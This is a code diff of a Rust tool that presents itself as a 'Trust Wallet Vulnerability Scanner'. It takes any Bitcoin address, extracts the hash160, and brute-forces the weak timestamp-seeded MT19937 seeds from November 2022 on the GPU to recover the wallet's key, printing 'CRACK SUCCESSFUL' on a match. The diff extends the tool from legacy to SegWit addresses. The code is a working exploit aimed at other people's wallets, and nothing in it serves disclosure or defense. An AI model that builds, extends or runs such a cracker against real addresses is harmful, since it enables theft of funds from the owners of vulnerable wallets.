@@ -4,8 +4,16 @@ use anyhow::Result;
 use std::str::FromStr;
 use tracing::{info, warn};
 
-/// Trust Wallet Browser Extension Vulnerability (100% GPU)
-/// MT19937 seeded with 32-bit timestamp
+/// Trust Wallet Browser Extension Vulnerability — GPU Scanner
+///
+/// MT19937 PRNG seeded with a 32-bit Unix timestamp.
+/// Vulnerable wallets were created in the window **2022-11-14 – 2022-11-23 UTC**.
+///
+/// Supported address types:
+///   P2PKH  (1...)    — legacy, script 25 bytes, hash160 at bytes [3..23]
+///   P2WPKH (bc1q...) — native SegWit, script 22 bytes, hash160 at bytes [2..22]
+///
+/// The GPU kernel receives the 20-byte hash160 and is agnostic to address type.
 pub fn run(target: Option<String>) -> Result<()> {
     info!("Trust Wallet Vulnerability Scanner (100% GPU)");
 
@@ -14,53 +22,76 @@ pub fn run(target: Option<String>) -> Result<()> {
         .ok_or_else(|| anyhow::anyhow!("Target address required"))?;
     info!("Target Address: {}", target_addr_str);
 
-    // Parse address with strict validation
-    let address =
-        bitcoin::Address::from_str(target_addr_str)?.require_network(bitcoin::Network::Bitcoin)?;
+    let address = bitcoin::Address::from_str(target_addr_str)?
+        .require_network(bitcoin::Network::Bitcoin)?;
     let script = address.script_pubkey();
-
-    // Strict P2PKH validation
-    if !script.is_p2pkh() {
-        warn!("Warning: Not a P2PKH address, skipping.");
-        return Ok(());
-    }
-
-    // Verify script length (P2PKH is exactly 25 bytes)
     let script_bytes = script.as_bytes();
-    if script_bytes.len() != 25 {
+
+    // Extract hash160 depending on address/script type.
+    //
+    // P2PKH (25 bytes):
+    //   [0]  0x76  OP_DUP
+    //   [1]  0xa9  OP_HASH160
+    //   [2]  0x14  OP_PUSHBYTES_20
+    //   [3..23]    <hash160>        ← extract here
+    //   [23] 0x88  OP_EQUALVERIFY
+    //   [24] 0xac  OP_CHECKSIG
+    //
+    // P2WPKH (22 bytes):
+    //   [0]  0x00  OP_0
+    //   [1]  0x14  OP_PUSHBYTES_20
+    //   [2..22]    <hash160>        ← extract here
+    let target_hash160: [u8; 20] = if script.is_p2pkh() {
+        if script_bytes.len() != 25 {
+            anyhow::bail!(
+                "Invalid P2PKH script length: {} bytes (expected 25)",
+                script_bytes.len()
+            );
+        }
+        if script_bytes[0] != 0x76 || script_bytes[1] != 0xa9 || script_bytes[2] != 0x14 {
+            anyhow::bail!("Malformed P2PKH script header");
+        }
+        script_bytes[3..23]
+            .try_into()
+            .expect("validated 25-byte P2PKH script")
+    } else if script.is_p2wpkh() {
+        if script_bytes.len() != 22 {
+            anyhow::bail!(
+                "Invalid P2WPKH script length: {} bytes (expected 22)",
+                script_bytes.len()
+            );
+        }
+        if script_bytes[0] != 0x00 || script_bytes[1] != 0x14 {
+            anyhow::bail!("Malformed P2WPKH script header");
+        }
+        script_bytes[2..22]
+            .try_into()
+            .expect("validated 22-byte P2WPKH script")
+    } else {
         anyhow::bail!(
-            "Invalid P2PKH script length: {} bytes (expected 25)",
-            script_bytes.len()
+            "Unsupported address type. \
+             Only P2PKH (1...) and P2WPKH (bc1q...) are supported."
         );
-    }
-
-    // Verify P2PKH structure: OP_DUP OP_HASH160 <20 bytes> OP_EQUALVERIFY OP_CHECKSIG
-    if script_bytes[0] != 0x76 || script_bytes[1] != 0xa9 || script_bytes[2] != 0x14 {
-        anyhow::bail!("Invalid P2PKH script header");
-    }
-
-    // Safe to extract hash160 after validation
-    let target_hash160: [u8; 20] = script_bytes[3..23]
-        .try_into()
-        .expect("Validated 25-byte P2PKH script");
+    };
 
     info!("Target Hash160: {}", hex::encode(target_hash160));
 
-    // Vulnerable window: Nov 14-23, 2022
-    let start_ts = 1668384000u32; // Nov 14 2022 00:00:00 UTC
-    let end_ts = 1669247999u32; // Nov 23 2022 23:59:59 UTC
+    // Vulnerable window confirmed by Unciphered disclosure.
+    let start_ts = 1_668_384_000u32; // 2022-11-14 00:00:00 UTC
+    let end_ts = 1_669_247_999u32;   // 2022-11-23 23:59:59 UTC
 
     info!(
-        "Scanning timestamps {} to {} ({} seconds)...",
+        "Scanning timestamps {} -> {} ({} seconds)...",
         start_ts,
         end_ts,
-        end_ts - start_ts
+        end_ts - start_ts + 1,
     );
 
     #[cfg(not(feature = "gpu"))]
     {
         anyhow::bail!(
-            "This scanner requires GPU acceleration. Please recompile with --features gpu"
+            "This scanner requires GPU acceleration. \
+             Recompile with `--features gpu`."
         );
     }
 
@@ -68,19 +99,23 @@ pub fn run(target: Option<String>) -> Result<()> {
     {
         let start_time = std::time::Instant::now();
         let solver = GpuSolver::new()?;
-        info!("[GPU] Solver initialized");
+        info!("[GPU] Solver initialised");
 
         let results = solver.compute_trust_wallet_crack(start_ts, end_ts, &target_hash160)?;
 
         if !results.is_empty() {
-            warn!("\n[GPU] 🔓 CRACKED SUCCESSFUL!");
-            for timestamp in results {
-                warn!("Found Timestamp: {}", timestamp);
+            warn!("\n[GPU] \u{1F513} CRACK SUCCESSFUL!");
+            for timestamp in &results {
+                warn!("  Found timestamp: {}", timestamp);
             }
         } else {
             info!("\nScan complete. No match found.");
         }
-        info!("Time elapsed: {:.2}s", start_time.elapsed().as_secs_f64());
+
+        info!(
+            "Time elapsed: {:.2}s",
+            start_time.elapsed().as_secs_f64()
+        );
         Ok(())
     }
 }
